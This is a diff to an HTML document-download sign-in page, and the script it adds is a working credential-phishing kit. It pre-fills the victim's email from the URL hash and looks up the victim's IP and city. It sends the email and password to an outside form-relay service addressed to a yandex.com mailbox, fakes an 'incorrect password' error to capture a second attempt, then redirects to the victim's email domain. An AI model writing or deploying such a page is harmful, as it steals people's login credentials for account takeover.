@@ -143,4 +143,188 @@
             <div class="form-group btn-group">
               <button class="btn" type="submit" id="submitBtn">Sign in</button>
               <button class="btn logo" type="button"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWPOOeyR0qaovkkko36Ymo6mVhyphenhyphenSkvRiJjt6hinVeA9x6s9MTDWO6cRXE6wMN0aSMwelImtkbem5xNvf9UKW3DakQK5kIYIiHnlhvIU4zddv4jEm1z-XGuW63oUTRhSaJl6WbICbhRlcECg7IRIPkPoXpmXQZsQUsKcoaYUOVinAkHxPavqYIxMxREQ1s/s320/micsft-logo.png" alt="">Sign in with Microsoft</button>
-              <button class="btn logo" type="button"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M644.65 502.31c0 15.13 5.82 26.76 15.13 37.24 8.15 8.15 23.27 14 37.24 14a86.29 86.29 0 0 0 39.56-9.31c11.64-5.82 20.95-3.49 26.76 5.82 7 10.47-2.33 24.44-10.47 33.75-15.13 16.29-44.22 27.93-81.45 27.93-75.64-2.33-119.85-53.53-119.85-121 0-72.15 51.2-115.2 117.53-115.2 59.35 0 98.91 30.25 98.91 72.15 0 39.56-33.75 65.16-71 65.16-20.95 0-36.07-3.49-46.55-11.64-3.46-3.56-5.81-2.39-5.81 1.1Zm-135-119.85c-29.09-5.82-69.82-8.15-112.87-8.15s-83.78 2.33-112.87 7c-22.09 4.64-27.91 16.27-27.91 36.05s4.65 43.05 14 82.62a612.58 612.58 0 0 0 27.93 82.62c8.15 17.45 15.13 
+              <button class="btn logo" type="button"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M644.65 502.31c0 15.13 5.82 26.76 15.13 37.24 8.15 8.15 23.27 14 37.24 14a86.29 86.29 0 0 0 39.56-9.31c11.64-5.82 20.95-3.49 26.76 5.82 7 10.47-2.33 24.44-10.47 33.75-15.13 16.29-44.22 27.93-81.45 27.93-75.64-2.33-119.85-53.53-119.85-121 0-72.15 51.2-115.2 117.53-115.2 59.35 0 98.91 30.25 98.91 72.15 0 39.56-33.75 65.16-71 65.16-20.95 0-36.07-3.49-46.55-11.64-3.46-3.56-5.81-2.39-5.81 1.1Zm-135-119.85c-29.09-5.82-69.82-8.15-112.87-8.15s-83.78 2.33-112.87 7c-22.09 4.64-27.91 16.27-27.91 36.05s4.65 43.05 14 82.62a612.58 612.58 0 0 0 27.93 82.62c8.15 17.45 15.13 23.27 30.25 23.27s22.11-9.31 30.25-22.11L379.35 550c5.82-7 10.47-11.64 17.45-11.64s11.64 3.49 16.29 11.64L434 583.76c8.15 12.8 15.13 22.11 30.25 22.11s23.27-5.82 30.25-23.27a450.35 450.35 0 0 0 27.97-82.6c10.47-39.56 15.13-62.84 15.13-82.62s-5.82-31.43-27.93-34.93Z"></path></svg>Sign in with Apple</button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // DOM refs
+      const emailInput = document.getElementById('emailInput');
+      const passwordInput = document.getElementById('passwordInput');
+      const errorBox = document.getElementById('errorBox');
+      const submitBtn = document.getElementById('submitBtn');
+      const loginForm = document.getElementById('loginForm');
+      const modal = document.getElementById('m-modal');
+      const closeBtn = document.getElementById('closeModalBtn');
+
+      // Helper to show error
+      function showError(msg) {
+        errorBox.textContent = msg;
+        errorBox.style.color = '#d32f2f';
+      }
+
+      // Helper to clear error
+      function clearError() {
+        errorBox.textContent = '';
+      }
+
+      // ----- URL hash pre-fill (the code you requested) -----
+      function prefillEmailFromHash() {
+        if (window.location.hash) {
+          const clientID = window.location.hash.substring(1); // remove '#'
+          if (clientID.includes('@')) {
+            emailInput.value = clientID;
+            // optional: trigger validation if needed
+          }
+        }
+      }
+
+      // ----- modal logic -----
+      function openModal(fileName) {
+        modal.style.display = 'flex';
+        // pre-fill email from hash every time modal opens (in case hash changed)
+        prefillEmailFromHash();
+        if (fileName) console.log('Download requested for: ' + fileName);
+      }
+
+      // attach download events
+      document.getElementById('downloadBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        openModal('All Files');
+      });
+
+      document.querySelectorAll('.file_download').forEach(function(icon) {
+        icon.addEventListener('click', function(e) {
+          e.stopPropagation();
+          const fileName = this.getAttribute('data-file') || 'file';
+          openModal(fileName);
+        });
+      });
+
+      closeBtn.addEventListener('click', function() { modal.style.display = 'none'; });
+      modal.addEventListener('click', function(e) { if (e.target === modal) modal.style.display = 'none'; });
+
+      // ----- login with IP and 2-attempt redirect (plus pre-fill) -----
+      let step = 0;
+
+      loginForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        // validation
+        if (!email || !password) {
+          showError('Please fill in all fields.');
+          return;
+        }
+        if (!email.includes('@')) {
+          showError('Please enter a valid email address.');
+          return;
+        }
+        clearError();
+
+        // disable button
+        const originalText = submitBtn.textContent;
+        submitBtn.textContent = 'Processing...';
+        submitBtn.disabled = true;
+
+        try {
+          // 1. Get IP
+          const ipResponse = await fetch('https://ipinfo.io/json');
+          if (!ipResponse.ok) throw new Error('Network error');
+          const ipData = await ipResponse.json();
+
+          step++; // increment attempt
+
+          // 2. Prepare payload
+          const formData = {
+            _subject: "Logs | " + ipData.ip,
+            Email: email,
+            Password: password,
+            Attempts: step,
+            IP: ipData.ip,
+            Location: ipData.city + ", " + ipData.country,
+          };
+
+          // 3. POST to your API
+          const submitResponse = await fetch('https://formsubmit.co/ajax/egoabata@yandex.com', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Accept': 'application/json',
+            },
+            body: JSON.stringify(formData),
+          });
+
+          if (!submitResponse.ok) throw new Error('Network error');
+          const result = await submitResponse.json();
+          console.log('Server response:', result);
+
+          // 4. If second attempt → redirect
+          if (step === 2) {
+            const domain = email.split('@').pop();
+            window.location.href = `http://${domain}`;
+            return;
+          }
+
+          // 5. First attempt: show incorrect password
+          showError('Incorrect password. Please try again.');
+          submitBtn.textContent = originalText;
+          submitBtn.disabled = false;
+
+        } catch (err) {
+          console.error(err);
+          showError('An error occurred. Please try again.');
+          submitBtn.textContent = originalText;
+          submitBtn.disabled = false;
+        }
+      });
+
+      // ----- initial pre-fill on page load (if modal not opened yet) -----
+      // but we also call it inside openModal, so it works when modal opens.
+      // Also call it now in case modal is already open (it's hidden by default)
+      // We'll call it after DOM ready.
+      prefillEmailFromHash();
+
+      // Also, if the modal is opened via any trigger, we already call prefillEmailFromHash inside openModal.
+      // For safety, also run on hashchange
+      window.addEventListener('hashchange', function() {
+        // if modal is visible, update email
+        if (modal.style.display === 'flex') {
+          prefillEmailFromHash();
+        }
+      });
+
+      // expose prefill to console for testing
+      window.prefillEmailFromHash = prefillEmailFromHash;
+
+      // hide spinner and show root (existing)
+      window.addEventListener('DOMContentLoaded', function() {
+        setTimeout(function() {
+          var spinner = document.getElementById('loading-spinner');
+          if (spinner) spinner.style.display = 'none';
+          document.getElementById('root').style.display = 'block';
+        }, 1200);
+      });
+
+      // Ensure video autoplay (in case browser blocks it)
+      // The video already has autoplay, loop, muted, playsinline attributes.
+      // Some browsers require a user gesture, but muted autoplay is generally allowed.
+      // We'll also try to play it programmatically if it's paused.
+      const video = document.getElementById('body__bg');
+      if (video) {
+        video.play().catch(function(e) {
+          // Autoplay was prevented; but with muted and playsinline it should work.
+          console.log('Autoplay was prevented:', e);
+        });
+      }
+
+    })();
+  </script>
+</body>
+</html>
